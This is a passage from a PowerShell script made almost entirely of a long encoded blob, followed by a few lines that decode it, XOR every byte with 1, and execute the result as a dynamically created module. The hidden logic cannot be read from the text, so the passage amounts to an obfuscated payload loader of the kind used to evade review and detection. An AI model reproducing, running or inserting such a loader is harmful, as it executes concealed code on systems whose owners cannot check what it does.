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"
    $scriptBlock = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString((Get-DecodedByte($encScriptBlock) | foreach {$_ -bxor 1})))
    New-Module -ScriptBlock $scriptBlock -ArgumentList @($Code, $xargs) -ReturnResult
}
